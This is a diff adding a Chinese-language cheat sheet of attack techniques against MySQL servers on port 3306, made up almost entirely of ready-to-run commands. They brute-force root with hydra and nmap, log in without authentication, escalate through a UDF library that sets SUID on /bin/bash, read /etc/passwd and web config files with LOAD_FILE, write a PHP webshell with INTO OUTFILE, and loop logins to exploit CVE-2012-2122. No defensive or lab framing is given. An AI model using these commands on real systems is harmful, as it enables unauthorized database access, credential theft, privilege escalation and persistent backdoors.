@@ -1,0 +1,44 @@
+# MySQL (3306) 利用技巧
+
+## 弱密码爆破
+```bash
+hydra -l root -P wordlist.txt mysql://target
+nmap --script mysql-brute -p 3306 target
+```
+
+## 未授权访问
+```bash
+mysql -h target -u root
+# root 空密码直接登录
+```
+
+## UDF 提权
+```sql
+-- 需要 mysql 插件目录可写
+SELECT @@plugin_dir;
+-- 上传 .dll/.so 到插件目录
+CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
+SELECT sys_exec('chmod u+s /bin/bash');
+
+-- MSF 自动利用
+use exploit/multi/mysql/mysql_udf_payload
+```
+
+## 读取文件
+```sql
+-- 需要 FILE 权限
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('/var/www/html/config.php');
+```
+
+## 写入 Webshell
+```sql
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';
+```
+
+## 常见漏洞
+```bash
+# CVE-2012-2122 认证绕过
+for i in {1..1000}; do mysql -h target -u root -pwrong -b --silent 2>/dev/null; done
+```
